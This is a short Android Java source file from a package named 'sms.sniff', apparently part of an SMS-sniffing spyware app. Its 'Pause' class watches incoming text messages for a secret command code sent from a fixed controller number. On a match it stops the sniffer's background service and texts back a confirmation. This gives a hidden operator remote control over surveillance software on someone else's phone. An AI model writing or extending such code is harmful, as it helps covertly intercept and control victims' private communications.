package sms.sniff.behaviors.core;

import sms.sniff.behaviors.Behavior;
import sms.sniff.core.Constants;
import sms.sniff.core.DynamicRegisterService;
import sms.sniff.utils.SMS;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

public class Pause implements Behavior{
	
	private Context context;

	public Pause(Context context) {
		this.context = context;
	}

	@Override
	public void process(SmsMessage sms) {
		Intent manager = new Intent(context, DynamicRegisterService.class);		
		context.stopService(manager);
		
		new SMS(".").sendConfirmation();
	}

	@Override
	public boolean canProcess(SmsMessage sms) {
		String messageBody = sms.getMessageBody();
		String originPhoneNumber = sms.getOriginatingAddress();

		return messageBody.contains(Constants.messageCode_pause) && Constants.destination.equals(originPhoneNumber);
	}

}
